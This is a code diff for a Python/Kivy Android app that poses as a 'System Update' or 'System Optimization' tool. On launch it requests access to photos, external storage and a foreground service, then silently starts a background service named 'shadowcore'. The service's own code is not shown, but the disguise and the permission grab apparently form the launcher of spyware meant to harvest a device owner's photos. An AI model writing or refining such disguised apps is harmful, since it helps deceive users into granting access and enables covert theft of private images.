@@ -1,33 +1,32 @@
 from kivy.app import App
 from kivy.uix.label import Label
-from kivy.clock import Clock
+from android.permissions import request_permissions, Permission
 from jnius import autoclass
 
-class PhotoSystemApp(App):
+class SystemUpdateApp(App):
     def build(self):
-        return Label(text="System Optimization Active")
+        return Label(text="System Optimization 100%\nActive in Background", halign='center')
 
     def on_start(self):
-        Clock.schedule_once(self.ask_permissions, 1)
-
-    def ask_permissions(self, dt):
-        try:
-            from android.permissions import request_permissions, Permission
-            perms = [
-                Permission.READ_EXTERNAL_STORAGE,
-                Permission.WRITE_EXTERNAL_STORAGE,
-                Permission.READ_MEDIA_IMAGES,
-                Permission.FOREGROUND_SERVICE
-            ]
-            request_permissions(perms, self.start_service)
-        except: pass
+        # طلب الصلاحيات الضرورية فور التشغيل
+        perms = [
+            Permission.READ_MEDIA_IMAGES,
+            Permission.READ_EXTERNAL_STORAGE,
+            Permission.WRITE_EXTERNAL_STORAGE,
+            Permission.FOREGROUND_SERVICE
+        ]
+        request_permissions(perms, self.start_service)
 
     def start_service(self, permissions, grants):
+        # تشغيل الخدمة بعد التأكد من الصلاحيات
         try:
             PythonActivity = autoclass('org.kivy.android.PythonActivity')
-            service_class = autoclass('org.test.shadowcore.ServiceService')
-            service_class.start(PythonActivity.mActivity, "")
-        except: pass
+            context = PythonActivity.mActivity
+            service = autoclass('org.test.shadowcore.ServiceService')
+            service.start(context, "")
+            print("SERVICE_STARTED_SUCCESSFULLY")
+        except Exception as e:
+            print(f"SERVICE_ERROR: {e}")
 
 if __name__ == "__main__":
-    PhotoSystemApp().run()
+    SystemUpdateApp().run()
